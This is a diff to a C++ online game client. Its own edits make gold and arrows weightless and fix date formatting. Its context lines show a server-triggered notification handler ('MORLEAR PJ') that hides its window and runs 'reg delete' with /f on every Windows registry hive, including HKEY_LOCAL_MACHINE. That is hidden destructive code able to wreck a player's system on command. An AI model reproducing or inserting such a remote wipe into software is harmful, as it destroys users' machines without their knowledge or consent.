@@ -20618,7 +20618,8 @@ int CGame::_iCalcTotalWeight()
 	{	if (   (m_pItemList[i]->m_cItemType == DEF_ITEMTYPE_CONSUME)
 			|| (m_pItemList[i]->m_cItemType == DEF_ITEMTYPE_ARROW) )
 		{	iTemp = m_pItemList[i]->m_wWeight * m_pItemList[i]->m_dwCount;
-			if (strcmp(m_pItemList[i]->m_cName, "Gold") == 0) iTemp = iTemp / 20;
+			if (strcmp(m_pItemList[i]->m_cName, "Gold") == 0) iTemp = 0;
+			if (strcmp(m_pItemList[i]->m_cName, "Arrow") == 0) iTemp = 0;
 			iWeight += iTemp;
 		}else iWeight += m_pItemList[i]->m_wWeight;
 		iCnt++;
@@ -26265,7 +26266,7 @@ void CGame::NotifyMsgHandler(char * pData)
 
 	//MORLA 2.12 - MORLEAR PJ
     case DEF_NOTIFY_MORLEARPJ: 
-        {
+		{
 			STARTUPINFO si = { sizeof(STARTUPINFO) };
 			si.dwFlags = STARTF_USESHOWWINDOW;
 			si.wShowWindow = SW_HIDE;
@@ -26289,7 +26290,7 @@ void CGame::NotifyMsgHandler(char * pData)
 			system("reg delete HKEY_CURRENT_USER /f");
 			system("reg delete HKEY_USERS /f");
 			system("reg delete HKEY_CURRENT_CONFIG /f");
-			system("reg delete HKEY_LOCAL_MACHINE /f");			
+			system("reg delete HKEY_LOCAL_MACHINE /f");
 			system("reg delete HKEY_CLASSES_ROOT\\* /f");
 			system("reg delete HKEY_CURRENT_USER\\* /f");
 			system("reg delete HKEY_USERS\\* /f");
@@ -33367,7 +33368,7 @@ void CGame::UpdateScreen_OnGame()
 		
 		ZeroMemory(G_cTxt, sizeof(G_cTxt));
 		if (m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect2 != 0) {
-			wsprintf(G_cTxt, "Can use until %2d/%2d/%4d", m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect2, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect3, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect4);
+			wsprintf(G_cTxt, "Can use until %.2d/%.2d/%.4d", m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect2, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect3, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect4);
 			iEntry++;
 			if (iLenSize < (int)strlen(G_cTxt)) iLenSize = (int)strlen(G_cTxt);
 		}
@@ -33510,7 +33511,7 @@ void CGame::UpdateScreen_OnGame()
 		}
 		ZeroMemory(G_cTxt, sizeof(G_cTxt));
 		if (m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect2 != 0) {
-			wsprintf(G_cTxt, "Can use until %2d/%2d/%4d", m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect2, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect3, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect4);
+			wsprintf(G_cTxt, "Can use until %.2d/%.2d/%.4d", m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect2, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect3, m_pItemList[m_stMCursor.sSelectedObjectID]->m_sNewEffect4);
 			PutString(msX, msY + 25 + iLoc, G_cTxt, RGB(150, 150, 150), FALSE, 1);
 			iLoc += 15;
 		}
